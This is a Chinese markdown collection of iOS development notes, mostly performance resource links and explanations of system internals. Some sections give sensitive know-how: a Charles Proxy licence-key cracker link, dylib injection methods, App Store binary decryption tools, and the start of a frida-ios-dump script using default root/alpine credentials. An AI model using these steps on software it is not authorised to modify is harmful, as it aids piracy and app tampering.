* [iOS应用UI线程卡顿监控](https://mp.weixin.qq.com/s?__biz=MzI5MjEzNzA1MA==&mid=2650264136&idx=1&sn=052c1db8131d4bed8458b98e1ec0d5b0&chksm=f406837dc3710a6b49e76ce3639f671373b553e8a91b544e82bb8747e9adc7985fea1093a394#rd)

#### 布局优化
TODO：

#### 电量优化 
* [Guide - Energy Efficiency Guide for iOS Apps](https://developer.apple.com/library/content/documentation/Performance/Conceptual/EnergyGuide-iOS/index.html#//apple_ref/doc/uid/TP40015243)
* [WWDC2017 - Writing Energy Efficient Apps](https://developer.apple.com/videos/play/wwdc2017/238/)
* [iOS 常见耗电量检测方案调研](https://github.com/ChenYilong/iOSBlog/issues/10)
* [教你开发省电的 iOS app（WWDC17 观后）](http://www.jianshu.com/p/f0dc653d04ca)
* [浅析移动蜂窝网络的特点及其省电方案](https://juejin.im/post/5a0c5af051882578da0d6925)
* [iOS电量测试实践](https://mp.weixin.qq.com/s/q39BHIWsbdNeqfH85EOkIQ)
* [iOS进阶--App功耗优化看这篇就够了](http://www.cocoachina.com/ios/20171204/21413.html)

#### 启动优化
* [WWDC2016-406-Optimizing App Startup Time](https://developer.apple.com/videos/play/wwdc2016/406)
* [WWDC2017-413-App Startup Time:Past,Present,and Future](https://developer.apple.com/videos/play/wwdc2017/413)
* [如何精准度量iOSAPP启动时间](https://www.jianshu.com/p/c14987eee107)
* [优化 App 的启动时间-杨萧玉](http://yulingtianxia.com/blog/2016/10/30/Optimizing-App-Startup-Time)
* [iOS客户端启动速度优化-今日头条](https://techblog.toutiao.com/2017/01/17/iosspeed/#more)
* [iOS App 启动性能优化-WiFi管家](https://mp.weixin.qq.com/s/Kf3EbDIUuf0aWVT-UCEmbA)
* [iOS App如何优化启动时间-Facebook](http://www.cocoachina.com/ios/20160104/14870.html)
* [iOS 启动速度优化-百度输入法](http://www.infoq.com/cn/presentations/ios-typewriting-start-speed-optimization)
* [obj中国-Mach-O 可执行文件](https://objccn.io/issue-6-3/)
* [iOS app启动速度研究实践](https://zhuanlan.zhihu.com/p/38183046?from=1086193010&wm=3333_2001&weiboauthoruid=1690182120)
* [iOS App冷启动治理：来自美团外卖的实践](https://mp.weixin.qq.com/s/jN3jaNrvXczZoYIRCWZs7w)
* [脉脉iOS如何启动秒开](https://zhuanlan.zhihu.com/p/396550853)

#### 体积优化
* [iOS微信安装包瘦身](http://mp.weixin.qq.com/s?__biz=MzAwNDY1ODY2OQ==&mid=207986417&idx=1&sn=77ea7d8e4f8ab7b59111e78c86ccfe66&scene=24&srcid=0921TTAXHGHWKqckEHTvGzoA#rd)
* [今日头条IPA安装包的优化](https://techblog.toutiao.com/2016/12/27/iphone/)
* [iOS瘦身之删除FrameWork中无用mach-O文件](http://www.infoq.com/cn/articles/ios-thinning-delete-unnecessary-mach-o)
* [基于clang插件的一种iOS包大小瘦身方案](http://www.infoq.com/cn/articles/clang-plugin-ios-app-size-reducing)
* [iOS可执行文件瘦身方法](http://blog.cnbang.net/tech/2544/)
* [iOS图片优化方案](http://crespoxiao.github.io/2016/11/12/iOS%E5%9B%BE%E7%89%87%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/)
* [滴滴出行 iOS 端瘦身实践的 Slides](https://ming1016.github.io/2017/06/12/gmtc-ios-slimming-practice/)

#### 网络优化
* [美团点评移动网络优化实践](http://tech.meituan.com/SharkSDK.html)
* [开源版HttpDNS方案详解](http://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&mid=209805123&idx=1&sn=ced8d67c3e2cc3ca38ef722949fa21f8)
* [携程App的网络性能优化实践](http://www.infoq.com/cn/articles/how-ctrip-improves-app-networking-performance)
* [2016年携程App网络服务通道治理和性能优化实践](http://www.infoq.com/cn/articles/app-network-service-and-performance-optimization-of-ctrip)
* [蘑菇街App Chromium网络栈实践](http://www.infoq.com/cn/articles/mogujie-app-chromium-network-layer)
* [蘑菇街高并发多终端无线网关实践](http://www.infoq.com/cn/presentations/mogujie-high-concurrent-multi-terminal-wireless-gateway-practice)
* [移动 APP 网络优化概述](http://blog.cnbang.net/tech/3531/?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)
 
#### 编译优化
* [Optimizing-Swift-Build-Times](https://github.com/fastred/Optimizing-Swift-Build-Times)

#### APM 
* [移动端监控体系之技术原理剖析](http://ios.jobbole.com/92988/)
* [网易 - NeteaseAPM iOS SDK技术实现分享](http://mp.weixin.qq.com/s?__biz=MzA3ODg4MDk0Ng==&mid=2651112215&idx=1&sn=9cc5b5fa630542a6d4b7a5626e35217a#rd)
* [网易乐得 - iOS无埋点数据SDK实践之路](http://www.jianshu.com/p/69ce01e15042) 
* [听云 - 移动端 APM 产品研发技能](http://www.infoq.com/cn/presentations/mobile-terminal-apm-product-development-skills) 
* [听云 - 移动 App 性能监测](http://www.infoq.com/cn/presentations/mobile-app-performance-monitoring-practice?utm_source=presentations_about_mobile&utm_medium=link&utm_campaign=mobile)
* [iOS 性能监控 SDK —— Wedjat（华狄特）开发过程的调研和整理](https://github.com/aozhimin/iOS-Monitor-Platform)
* [揭秘 APM iOS SDK 的核心技术](https://github.com/iOS-APM/iOS-APM-Secrets)  
* [iOS-Monitor-Resources](https://github.com/aozhimin/iOS-Monitor-Resources) 
* [iOS 流量监控分析](https://juejin.im/post/5b1602906fb9a01e3542f08c)
* [小试Xcode逆向：app内存监控原理初探](http://ddrccw.github.io/2017/12/30/reverse-xcode-with-lldb-and-hopper-disassembler)
* [APMCon-2016演讲实录](http://apmcon.cn/2016/index.html#yjsl)  
* [360移动端性能监控实践QDAS-APM（iOS篇）](https://mp.weixin.qq.com/s/Vq0TDiLbexxBlqlf_lilnQ)  
* [移动端性能监控方案Hertz](https://tech.meituan.com/2016/12/19/hertz.html)

#### 调试 & Crash
* [iOS 项目开发过程中用到的高级调试技巧，涉及三方库动态调试、静态分析和反编译等领域](https://github.com/aozhimin/iOS-Debug-Hacks)
* [Understanding and Analyzing Application Crash Reports](https://developer.apple.com/library/content/technotes/tn2151/_index.html) 


#### 相关开源库
##### 网络
* [HTTPDNSLib-for-iOS](https://github.com/CNSRE/HTTPDNSLib-for-iOS)
* [HTTPDNSLib-for-Andorod](https://github.com/CNSRE/HTTPDNSLib)
* [NetworkEye](https://github.com/coderyi/NetworkEye/blob/master/README_Chinese.md) 

##### 内存
* [FBMemoryProfiler](https://github.com/facebook/FBMemoryProfiler)
* [iOS Memory Budget Test](https://github.com/Split82/iOSMemoryBudgetTest)

##### 卡顿
* [PerformanceMonitor-Runloop](https://github.com/suifengqjn/PerformanceMonitor)
* [GYMonitor-FPS](https://github.com/featuretower/GYMonitor)

##### 瘦身
* [LSUnusedResources](https://github.com/tinymind/LSUnusedResources)
* [LinkMap](https://github.com/huanxsd/LinkMap)

#### APM
* [iOS-System-Services](https://github.com/iOS-APM/iOS-System-Services)
* [System Monitor](https://github.com/iOS-APM/SystemMonitor)
* [PerformanceTestingHelper](https://github.com/ArmsZhou/PerformanceTestingHelper)
* [GT](https://github.com/Tencent/GT) 
* [GodEye](https://github.com/zixun/GodEye)
* [ArgusAPM](https://github.com/Qihoo360/ArgusAPM)
* [AppleTrace](https://github.com/everettjf/AppleTrace)
* [matrix](https://github.com/Tencent/matrix)
* [MTHawkeye](https://github.com/meitu/MTHawkeye)


# -----------------------------------

## 关于4个 0day iOS 漏洞

Denis Tokarev 发表文章公开披露 4 个 0-day iOS 漏洞，

吐槽苹果没有署名感谢，最关键是苹果没有给赏金！

作者怒了, 一口气开源4个漏洞  https://github.com/illusionofchaos/ios-nehelper-wifi-info-0day

以下是作者披露文章：

文章:  Disclosure of three 0-day iOS vulnerabilities and critique of Apple Security Bounty program / Хабр
https://habr.com/ru/post/579714/

# -----------------------------------

二、事件始末

从 Twitter 可知 illusionofchaos 为化名的研究人员真名是 Denis Tokarev（丹尼斯·托卡列夫），

目前关于 Denis Tokarev 个人资料并不多，通过其使用俄语的网页披露漏洞，猜测他是俄罗斯人。

作者称在今年 3 月 10 日 ~ 5 月 4 日之间给苹果报告了 4 个 0-day 漏洞，

只在 iOS 14.7 修复了一个，但苹果在iOS 14.7 安全性内容

更新页面并没有披露出来！当作者向苹果(Apple Product Security)提出质疑时，他们承诺在下一次系统版本更新的页面中列出，

但此后的三次版本发布都没有列出。所以作者怒了！决定披露出来！

0-day 漏洞

0day，zero-day vulnerability，0-day vulnerability，零日漏洞或零时差漏洞。
# -----------------------------------

## `iOS`平台付费软件篇 (iOS)

评分   | 名称  | 功能简述 | 单价 | 测评
----- | ----- | ------ | ----- | -----
★★★★  | [Camera+] | 替代原生拍照软件 | $1.99 | [#](http://iphone.appstorm.net/reviews/graphics/camera-4-an-almost-perfect-camera-app/)
★★★★  | [1Password] | 密码管理&同步 | $17.99 | [#](http://mac.appstorm.net/reviews/security/1password-4-is-hands-down-the-best-password-app/)
★★★★  | [Tweetbot] | Twitter 客户端 | $2.99 | [#](http://www.macstories.net/reviews/tweetbot-3-review-human-after-all/)
★★★★  | [Weico Pro] | 新浪微博第三方客户端 | ￥6 | [#](http://sspai.com/24186)
★★★★  | [iTranslate Voice] | 翻译利器 | $4.99 | [#](http://www.idownloadblog.com/2013/07/03/itranslate-voice-2/)
★★★★  | [Launch Center Pro] | 快速启动&书签 | $4.99 | [#](http://www.macstories.net/reviews/launch-center-pro-2-0-review/)
★★★★  | [Clear+] | 轻量级 To-Do List | $4.99 | [#](http://www.macworld.com/article/2048920/clear-for-ios-7-review-slick-to-do-list-app-gets-bigger-slicker.html)
★★★★  | [Drafts 4] | 文字生产力 | $9.99 | [#](http://www.macstories.net/ios/drafts-4-1-and-merging-notes/)
★★★★  | [MoneyWiz 2] | 记账软件 | $4.99 | [#](http://sspai.com/28132)
★★★☆  | [Todo] | 重量级 To-Do GTD | $4.99 | [#](http://www.imore.com/todo-7-ios-review-brand-new-look-and-great-new-experience)
★★★☆  | [Reeder] | RSS阅读器 | $4.99 | [#](http://www.macstories.net/reviews/reeder-2-review-2/)
★★★☆  | [Omnifocus] | 还是那个GTD | $19.99 | [#](http://www.imore.com/omnifocus-2-iphone-review-completely-redesigned-ios-7-easier-use-ever)
★★★☆  | [Fantastical] | 日历和提醒工具 | $3.99 | [#](http://www.macworld.com/article/2058681/fantastical-2-for-iphone-review-calendar-app-gets-more-fantastic-for-ios-7.html)
★★★☆  | [GoodReader] | 文档管理、阅读工具 | $4.99 | [#](http://www.macworld.com/product/460078/goodreader-for-ipad.html)
★★★   | [Sleep Cycle] | 智能闹钟 | $1.99 | [#](http://mymorningroutine.com/sleep-cycle-review/)
★★★   | [Afterlight] | 照片处理软件 | $0.99 | [#](http://ipad.appstorm.net/reviews/photography-reviews/afterlight-simple-subtle-photo-editing-brilliance/)
★★★   | [Moves] | 健康计步类| $2.99 | [#](http://www.trustedreviews.com/moves_Mobile-App_review)
★★★   | [TextExpander] | 快速输入/扩展增强工具 | $4.99 | [#](http://www.macstories.net/reviews/textexpander-touch-2-0-brings-fill-in-snippets-formatted-text-to-ios/)
★★★   | [Pastebot] | 云剪切板 | $3.99 | [#](http://www.macstories.net/reviews/pastebot-iphone-review/)
★★★   | [Byword] | Markdown写作 | $4.99 | [#](http://iphone.appstorm.net/reviews/productivity/byword-2-1-beautiful-markdown-for-ios-7/)
★★★   | [Day One] | 日记软件 | $4.99 | [#](http://www.macstories.net/tag/day-one/)
★★★   | [Solar Walk] | 太阳系模型 | $2.99 | [#](http://reviews.cnet.com/8301-19512_7-57539611-233/coolest-app-ive-seen-all-month-solar-walk/)
★★★   | [OmniGraffle] | 制图制表 | $49.99 | [#](http://mac.appstorm.net/reviews/graphics/omnigraffle-6-a-huge-leap-for-the-mac-diagraming-app-2/)
★★★   | [随手记专业版] | 记账软件 | ￥6 | [#](http://digi.tech.qq.com/a/20111107/000548_1.htm)
★★★   | [DailyCost] | 记账软件 | $1.99 | [#](http://iphone.appstorm.net/reviews/business-finance/dailycost-tracking-your-spending-just-got-beautiful/)
★★★   | [Splashtop] | 用iOS远程控制计算机 | $9.99 | [#](http://www.macworld.com/article/2030876/review-splashtop-2-a-free-innovative-remote-desktop-mac-ios-app-with-issues.html)
★★★   | [Things] | 还是GTD | $9.99 | [#](http://www.idownloadblog.com/2013/10/15/todo-7-review/)
★★★   | [Runtastic Pro] | 跑步健康类 | $4.99 | [#](http://theruniverse.com/2012/07/review-runtastic-pro-gps-iphone-app/)
★★★   | [Wolfram] | 计算和知识库 | $2.99 | [#](http://lifehacker.com/tag/wolfram-alpha)
★★★   | [Solar] | 精美天气应用 | $0.99 | [#](http://www.imore.com/solar-weather-iphone-review)
★★★   | [Writer Pro] | 个人写作软件 | $19.99 | [#](http://www.imore.com/writer-pro-now-available-app-store-both-mac-and-ios)
★★★   | [Editorial] | MarkDown书写软件 | $6.99 | [#](http://www.macstories.net/stories/editorial-for-ipad-review/)
★★★   | [Notability] | 日记软件 | $2.99 | [#](http://www.laptopmag.com/reviews/note-taking-apps/notability.aspx)
★★★   | [Gneo] | GTD:To-do类 | $9.99 | [#](http://appadvice.com/review/quickadvice-gneo)
★★★   | [Mextures] | 照片效果处理软件 | $1.99 | [#](http://reviews.cnet.com/software/mextures-ios/4505-3513_7-35782639.html)
★★★   | [Vesper] | 收集想法笔记 | $4.99 | [#](http://www.macstories.net/reviews/vesper-review-collect-your-thoughts/)
★★★   | [TeeVee] | 追美剧、TV Show等 | $1.99 | [#](http://www.imore.com/teevee-2-iphone-can-track-your-favorite-shows-and-alert-you-when-new-episode-airing)
★★★   | [Air Display] | 用iOS设备做为扩展屏 | $9.99 | [#](http://www.148apps.com/reviews/air-display-2-review/)
★★★   | [Instaframe Pro] | 多图合一，拼合工具 | $1.99 | [#](http://www.148apps.com/reviews/instaframe-pro-review/)
★★★   | [OmmWriter] | 静心写作 | $4.99 | [#](http://www.148apps.com/reviews/ommwriter-ipad-review/)
★★★   | [Prompt] | SSH远程Host管理客户端 | $7.99 | [#](http://www.148apps.com/reviews/prompt-review/)
★★★   | [iA Writer] | 写作工具 | $4.99 | [#](http://www.geekswithjuniors.com/blog/2012/10/17/ia-writer.html)
★★★   | [StockWatch] | 股票行情查看 | $5.99 | [#](http://www.imore.com/bloomberg-ipad-review-casual-stock-app-ipad)
★★★   | [Money Monitor] | 金融理财记账工具 | $1.99 | [#](http://www.imore.com/top-5-budget-finance-tracking-apps-iphone)
★★★   | [Living Earth Clock] | 全球时间工具 | $2.99 | [#](http://www.148apps.com/reviews/living-earth-hd-world-time-clock-weather-review/)
★★★   | [Sync for Firefox] | 如果你是火狐用户 | $0.99 | [#](https://support.mozilla.org/en-US/questions/964649)
★★★   | [Screens VNC] | 远程桌面工具VNC | $19.99 | [#](http://www.imore.com/screens-20-review)
★★★   | [Mobile Mouse] | 用手机做为鼠标或触控板 | $1.99 | [#](http://www.knowyourmobile.com/apps/10288/mobile-mouse-ipad-review)
★★★   | [Live Cams Pro] | 使用查看全球数以千计的公共摄像头 | $3.99 | [#](http://forums.imore.com/ios-apps-games/258748-world-live-cams-pro-surveillance-camera-viewer-app.html)
★★★   | [FileBrowser] | 查看远程电脑的文件 | $4.99 | [#](http://www.macworld.com/product/462870/filebrowser-access-files-on-remote-computers.html)
★★★   | [TextGrabber] | OCR图片文字识别(图转字)工具 | $5.99 | [#](http://www.iphonejd.com/iphone_jd/2013/04/review-abbyy-textgrabber-translator.html)
★★★   | [欧路词典 Pro] | 翻译软件，支持离线词库，屏幕取词 | ￥18 | [#](http://www.eudic.net/eudic/mac_dictionary.aspx)
★★★   | [Mercury Browser Pro] | 浏览器 | $0.99 | [#](http://www.macworld.com/product/377687/mercury-web-browser-pro-the-most-advanced-brow.html)
★★★   | [Air Video] | 移动端播放电脑上的视频流，无需拷贝 | $2.99 | [#](http://www.tuaw.com/2013/11/05/how-a-pc-and-air-video-hd-turned-my-ipad-into-the-ultimate-enter/)
★★★   | [MacID](https://itunes.apple.com/app/id948478740?mt=8&ls=1) | 手机解锁 Mac, iOS 和 macOS 间剪贴板，itunes 简单控制 | $3.99 | [#](https://itunes.apple.com/app/id948478740?mt=8&ls=1)

 # -----------------------------------
 
  ### iOS群控实现 - WebDriverAgent
  ## [iPhone群控测试开发教程](https://mp.weixin.qq.com/s?__biz=MjM5MjUxODExMQ==&mid=2652393753&idx=1&sn=1edb1a7db6b4225dbd4b6b4df8af96f7&chksm=bd49eba98a3e62bf45ec72d14dd0640268bef05efb4489edd3c0c4803049e50f369fa98c4711&mpshare=1&scene=22&srcid=11160hQ6GGnxFSQxIxb5Yf2N&sharer_sharetime=1637022101829&sharer_shareid=7a5b79e2ee76a21460e7fe67bd1a6b50#rd)
 ```
WebDriverAgent是用于iOS的WebDriver服务器实现，
可用于远程控制iOS设备。它允许您启动和终止应用程序，
点击并滚动视图或确认屏幕上是否存在视图。
这使其成为用于应用程序端到端测试或通用设备自动化的理想工具。

它通过链接XCTest.framework和调用Apple的API
来直接在设备上执行命令来工作。
WebDriverAgent是Facebook开发和用于端到端测试的


安装 homebrew
homebrew 是 Mac OS 下最优秀的包管理工具，没有之一。
xcode-select --install ruby -e "$(curl -fsSLhttps://raw.githubusercontent.com/Homebrew/install/master/install)"

安装 python
脚本语言 python 用来编写模拟的用户操作。
brew install python3

安装 libimobiledevice
libimobiledevice 是一个使用原生协议与苹果iOS设备进行通信的库。
通过这个库我们的 Mac OS 能够轻松获得 iOS 设备的信息。
brew install --HEAD libimobiledevice


查看 iOS 设备日志


idevicesyslog
查看链接设备的UDID


idevice_id --list
查看设备信息


ideviceinfo
获取设备时间


idevicedate
获取设备名称


idevicename
端口转发


iproxy XXXX YYYY
屏幕截图
idevicescreenshot

安装 Carthage

Carthage 是一款iOS项目依赖管理工具，与 Cocoapods 有着相似的功能，可以帮助你方便的管理三方依赖。它会把三方依赖编译成 framework，以 framework 的形式将三方依赖加入到项目中进行使用和管理。

WebDriverAgent 本身使用了 Carthage 管理项目依赖，因此需要提前安装 Carthage。

brew install carthage

安装 WebDriverAgent

WebDriverAgent 是 Facebook 推出的一款 iOS 移动测试框架，能够支持模拟器以及真机。

WebDriverAgent 在 iOS 端实现了一个 WebDriver server ，借助这个 server 我们可以远程控制 iOS 设备。你可以启动、杀死应用，点击、滚动视图，或者确定页面展示是否正确。

从 github 克隆 WebDriverAgent 的源码。

git clone https://github.com/facebook/WebDriverAgent.git

运行初始化脚本，确保之前已经安装过 Carthage。

iPhone群控测试开发教程
https://mp.weixin.qq.com/s?__biz=MjM5MjUxODExMQ==&mid=2652393753&idx=1&sn=1edb1a7db6b4225dbd4b6b4df8af96f7&chksm=bd49eba98a3e62bf45ec72d14dd0640268bef05efb4489edd3c0c4803049e50f369fa98c4711&mpshare=1&scene=22&srcid=11160hQ6GGnxFSQxIxb5Yf2N&sharer_sharetime=1637022101829&sharer_shareid=7a5b79e2ee76a21460e7fe67bd1a6b50#rd

 ```
 
 ### 自定义创建.dylib文件
 ```
 1.创建新工程 , 选择OS X ->Framework&Library-> Library
 
 2.TARGETS ->Build Settings -> Installation Directory 修改成@executable_path/
 
 3.TARGETS -> Build Settings -> Base SDK 改成Latest iOS或者iOS X.X
 
 4.PROJECT->Info->iOS Deployment Target 选择版本支持
 
 5.Project->Build Settings ->Base SDK 改成Latest iOS或者iOS X.X6.选择证书
 
 7.选择设备, 运行
 ```
 
 ## 越狱iOS系统内存限制修改

在 iOS 中重要的监控网络进程内存使用量和停止溢出限制的边缘配置在它的配置 Jetsam 中有相关的内存做限制的，
它的一般文件在/System/Library/LaunchDaemons/com.apple.jetsamproperties.{Model}.plist，
模型在各个手机上可能里面对 VPN 进程做限制的条目是：

				<key>com.apple.networkextension.packet-tunnel</key>
				<dict>
					<key>ActiveHardMemoryLimit</key>
					<integer>15</integer>
					<key>InactiveHardMemoryLimit</key>
					<integer>15</integer>
					<key>JetsamPriority</key>
					<integer>14</integer>
				</dict>
打开文件后搜索packet-tunnel找到，其中有两个15就是 iOS 对 VPN 进程的内存限制值 15MB。

要修改iOS VPN进程的内存限制，我们很容易复制iFile等文件管理工具找到这些配置文件，到电脑上然后对相关数值进行修改，修改后覆盖原始文件，恢复一下手机智能。

打开要这些plist文件需要一些特殊的编辑器;如果你用的是macOS，且安装有Xcode中，那就可以直接双击打开，

要修改的很明显，就是要把内容改大就行，比如把原来的15MB的限制改为30MB的限制：

				<key>com.apple.networkextension.packet-tunnel</key>
				<dict>
					<key>ActiveHardMemoryLimit</key>
					<integer>30</integer>
					<key>InactiveHardMemoryLimit</key>
					<integer>30</integer>
					<key>JetsamPriority</key>
					<integer>14</integer>
				</dict>
 
 ## Charles 抓包工具
  Charles激活码:  https://www.zzzmode.com/mytools/charles/
  ```
  安装使用最新版，官方下载地址 https://www.charlesproxy.com/download
  此工具用于计算Charles激活码，下载代码 ，在线运行代码：https://play.golang.org/p/Qtt2CmHbTzU
  blog介绍: https://blog.zzzmode.com/2017/05/16/charles-4.0.2-cracked
  输入RegisterName(此名称随意，用于显示 Registered to xxx)，点击生成计算出注册码，打开Charles输入注册码即可。
 ```
 
## dyld 苹果操作系统的动态链接器
 ```
dyld和操作系统的关系准确来说，操作系统通过映射的方式将它加载到进程的地址空间中。

操作系统加载完dyld后，就把控制权交给dyld。当dyld得到控制权后，其自身开始一系列的初始化操作，然后后根据设置的环境变量，
对可执行文件进行链接工作，这个链接步骤称为动态链接(dynamic link)。
当所有链接工作完成后，dyld会把控制权交给可执行文件的入口，程序开始执行。
那可执行文件又是什么，既然有动态链接，是否也有静态链接？是的，静态链接就是生成可执行文件的一个重要步骤。

2.2 可执行文件
可执行文件是程序的源代码文件经过预编译、编译、汇编生成的目标文件，进一步通过链接合并成可供系统执行的文件，
也就是mach.o文件。可执行文件需要被装载进内存，才能被系统读取。

这是mach.o文件结构的官方图。其主要分为三个部分：

Header(头部信息)，说明整个Mach.o文件的基本信息
Load Commands(加载命令)，说明系统应该怎么加载文件中的数据
Data(文件数据)，包含符号表，代码签名，程序代码等数据。

可执行文件查看步骤：
在项目Products文件夹下的.app结尾的文件 Show In Finder,然后显示包内容
但是想要可视化可执行文件，还需要借助第三方软件MachOView。
可执行文件生成的步骤如果展开来，不是三言两语能讲清楚的，这里只做个简单的介绍：
预编译:**预编译的过程就是处理源代码文件中以"#"开头的预编译指令，将其展开。
**
编译:编译的过程就是把预编译后文件进一步做词法分析，语法分析，生成抽象语法树，经过语义分析后转换成中间代码，优化后生成汇编代码文件。
汇编:汇编的过程就是把汇编代码转变成机器可以执行的指令。
链接:链接的过程就是把各个源代码模块相互引用的部分进行处理，让它们之间可以正确链接。这里的链接即为静态链接。
装载：** 装载的过程就是把程序执行所需要的指令和数据都装入内存中**

静态链接是编译时的链接工作，动态链接是运行时的链接工作，虽然它们做的事很相似，但是不可混为一谈。

dyld2:在iOS13之前使用的版本
dyld3:在iOS13及之后使用的版本，iOS11之前的系统库优化已经使用

dyld2在启动时做了大量的计算和查找操作，系统为了优化启动时间，设计了dyld3，dyld3的接口和dyld2是兼容的，因此开发者没有任何感知。
dyld3的特点是进程外的且有缓存的，启动app前把很多耗时操作提前处理好了。据统计，在冷启动时，dyld3比dyld2快20%。
但是由于dyld3是未开源的，因此本文是基于dyld2展开流程分析的，这些工作流程在dyld3也是存在的，可能只是时机会有所不同。

ASLR(Address space layout randomization):地址空间布局随机化，虚拟地址在内存中会发生的偏移量。增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。
PIC(Position Independent Code):程序中共享指令部分在装载时不需要因为装载地址的改变而改变，实现共享。
页错误(Page Fault):在当前页中找不到所需指令。操作系统需要计算相应页面在可执行文件中的偏移，在物理内存中分配物理页面，在虚拟页和物理页建立映射关系。程序才能从发生页面错误的位置重新执行。
延迟绑定(Lazy Binding):函数第一次被使用时才进行绑定(符号查找，重定位等)。

 ```
 
 ## Clang编译器
 ```
Clang是LLVM项目中的一个子项目。它是基于LLVM架构的轻量级编译器，诞生之初是为了替代GCC，
提供更快的编译速度。它是负责编译C、C++、Objecte C语言的编译器，它属于整个LLVM架构中的编译器前端。
 ```
 
 ## iOS系统响应事件机制
 ```
 1.手指触碰屏幕，屏幕感应到触碰后，将事件交由IOKit处理。

 2.IOKit将触摸事件封装成一个IOHIDEvent对象，并通过mach port传递给SpringBoad进程。
   mach port 进程端口，各进程之间通过它进行通信。
   SpringBoad.app 是一个系统进程，可以理解为桌面系统，可以统一管理和分发系统接收到的触摸事件。

 3. SpringBoard进程因接收到触摸事件，触发了主线程runloop的source1事件源的回调。

此时SpringBoard会根据当前桌面的状态，判断应该由谁处理此次触摸事件。
因为事件发生时，你可能正在桌面上翻页，也可能正在刷微博。
若是前者（即前台无APP运行），
则触发SpringBoard本身主线程runloop的source0事件源的回调，
将事件交由桌面系统去消耗；若是后者（即有app正在前台运行），
则将触摸事件通过IPC传递给前台APP进程
```

# iOS动态库注入方式
```
dylib注入也有三种方式：

1.越狱环境下, 将动态库上传到DynamicLibraries目录下

2.越狱环境下, 使用dyld中的DYLD_INSERT_LIBRARIES环境变量

3.免越狱环境下, 使用optool或者yololib工具给macho新增Load command
```

## class-dump类对关键属性名和方法名做混淆处理 怎么办?
### iOS逆向静态分析工具大概查看它的实现逻辑
```
静态分析工具是能够将macho文件的机器语言代码反编译成汇编代码、OC伪代码或者Swift伪代码，同时可以快速查看关键字符串信息。
这就很强大了，意味着可以通过查看方法的执行流程，判断条件等信息明白它在做什么，如果本地字符串未做混淆，
也可以直接被获取到(比如有些app秘钥明文存储本地，这就危险了)。

iOS平台主要使用的静态分析工具有Hopper和IDA。
IDA更强大，它能够翻译成的伪代码更接近于高级语言，但是它的收费也是昂贵的。
Hopper虽然不如IDA强大，但也是够用的了，所以我个人使用的是Hopper。
把Mach-O文件直接拖入Hopper，尝试搜索你感兴趣或者头文件中存在的字符，会得到如下界面
```

## iOS逆向动态调试工具
```
动态调试就是将程序运行起来，通过打断点(LLDB需要)、打印等方式，查看参数、返回值、函数调用流程等信息，
通过输出界面信息迅速定位目标代码，还可以动态的修改内存和寄存器中的参数，达到绕过检测，更改执行流程等目的。
动态调试主要有LLDB和CyCript两种工具，两种都很好强大，也各有各的好，建议两种方式都需要学习。

神器FLEX界面调试UI
```

## iOS 图形渲染

```
UIKit：通过UIKit提供的街交口进行布局和绘制界面，UIKit本身不具备显示能力，是通过底层的layer实现的。


CoreAnimation：本质上是一个复合引擎，主要职责在于渲染，构建和动画。CAlayer属于CoreAnimation，是界面可视化的承载。


CoreGraphics：基于Quartz的高级绘图引擎，提供了轻量级的2d渲染能力，主要是用于运行时绘图的。CG开头的类都属于CoreGraphics。


CoreImage：一个高性能的图像处理分析的框架，运行前绘制图形，主要提供图形的滤镜功能。


OpenGL ES：针对嵌入式设备，是OpenGL的子集。直接操作硬件服务，是跨平台的。


Metal：苹果自研的针对自家设备的图形渲染标准，在苹果设备上性能最优。
```

## 浅谈iOS ipa砸壳知识
```
App Store上下载的包
苹果会对Mach-O里面__TETX段里面的内容进行加密，如果不解密无法做后续操作。

所以砸壳dump ipa技术就应运而生
砸壳分为静态砸壳和动态砸壳

动态砸壳的原理主要是
虽然Mach-O中的__TEXT段被苹果加密了，
但是系统如果要运行程序，肯定需要对内容进行解密。
所以就不去主动的砸掉原有的加密壳，而是当应用程序打开运行后，壳被系统自动解密后，
在内存中把解密后的数据二进制文件提取出来，也就达到了砸壳的目的。
(手机端插件CrackerXI砸壳, frida-ios-dump电脑砸壳)
iOS利用CrackerXI（脱壳）: https://www.jianshu.com/p/97a97ff81384
```

## iOS AutoreleasePool原理
```
自动释放池本质是一个AutoreleasePoolPage结构体对象，栈结构存储，每一个AutoreleasePoolPage以双向链表形式连接
自动释放的压栈和出栈本质上是调用AutoreleasePoolPage的push和pop方法
push 压栈
判断hotPage是否存在
不存在，autoreleaseNoPage创建新hotPage，调用add方法将对象添加至page栈中
存在满了，autoreleaseFullPage初始新的page
存在没满，调用add方法将对象添加到page的next指针，next指针++
pop 出栈
执行pop出栈时，会传入push操作的返回值，即POOL_BOUNDARY的内存地址token，根据token找到哨兵对象所在，并释放之前的对象，next指针--
```

## 响应式编程
```
也叫做声明式编程，这是现在前端开发的主流，当然对于客户端开发的一种趋势，比如SwiftUI 。

响应式简单来说其实就是你不需要手动更新界面，只需要把界面通过代码“声明”好，然后把数据和界面的关系接好，数据更新了界面自然就更新了。
从代码层面看，对于原生开发而言，没有 xml 的布局，没有 storyboard，布局完全由代码完成，所见即所得，
同时也不会需要操作界面“对象”去进行赋值和更新，你所需要做的就是配置数据和界面的关系。

响应式开发比数据绑定或者 MVVM 不同的地方是，它每次都是重新构建和调整整个渲染树，而不是简单的对 UI 进行 visibility 操作。
```

## python3-frida-ios-hook-jailbreak
```
#!/usr/bin/env python3

import sys
import codecs
import frida
import threading
import os
import shutil
import time
import argparse
import tempfile
import subprocess
import re

import paramiko
from paramiko import SSHClient
from scp import SCPClient
from tqdm import tqdm
import traceback
from log import *

script_dir = os.path.dirname(os.path.realpath(__file__))

DUMP_JS = os.path.join(script_dir, '../../methods/dump.js')

User = 'root'
Password = 'alpine'
Host = 'localhost'
Port = 2222

TEMP_DIR = tempfile.gettempdir()
PAYLOAD_DIR = 'Payload'
PAYLOAD_PATH = os.path.join(TEMP_DIR, PAYLOAD_DIR)
file_dict = {}

finished = threading.Event()


def get_usb_iphone():
    Type = 'usb'
    if int(frida.__version__.split('.')[0]) < 12:
        Type = 'tether'
    device_manager = frida.get_device_manager()
    changed = threading.Event()

    def on_changed():
        changed.set()

    device_manager.on('changed', on_changed)

    device = None
    while device is None:
        devices = [dev for dev in device_manager.enumerate_devices() if dev.type == Type]
        if len(devices) == 0:
            print('Waiting for USB device...')
            changed.wait()
        else:
            device = devices[0]

